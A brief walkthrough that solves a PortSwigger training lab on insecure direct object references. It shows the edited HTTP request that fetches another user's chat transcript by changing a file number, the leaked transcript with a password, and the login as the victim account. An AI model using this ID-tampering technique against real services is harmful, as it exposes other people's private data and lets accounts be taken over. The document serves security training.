# Lab: Insecure direct object references
# https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references

```bash
# Open live chat and click on view transcript.

# Open http history and check GET /download-transcript/2.txt request.
```
```bash
# Send it to burp repeater and update it to this:

GET /download-transcript/1.txt HTTP/2
Host: 0a8800e204fe5024801e766f008200f1.web-security-academy.net
Cookie: session=damV19BenoboatGuAKNugdHUhgNS53Dw
.

# Response:

CONNECTED: -- Now chatting with Hal Pline --
You: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one
Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.
You: Wow you're so nice, thanks. I've heard from other people that you can be a right ****
Hal Pline: Takes one to know one
You: Ok so my password is y6cctfe287fsac0ggrvv. Is that right?
Hal Pline: Yes it is!
You: Ok thanks, bye!
Hal Pline: Do one!

# Password is: y6cctfe287fsac0ggrvv

# Login to carlos with that password to complete the lab.
```

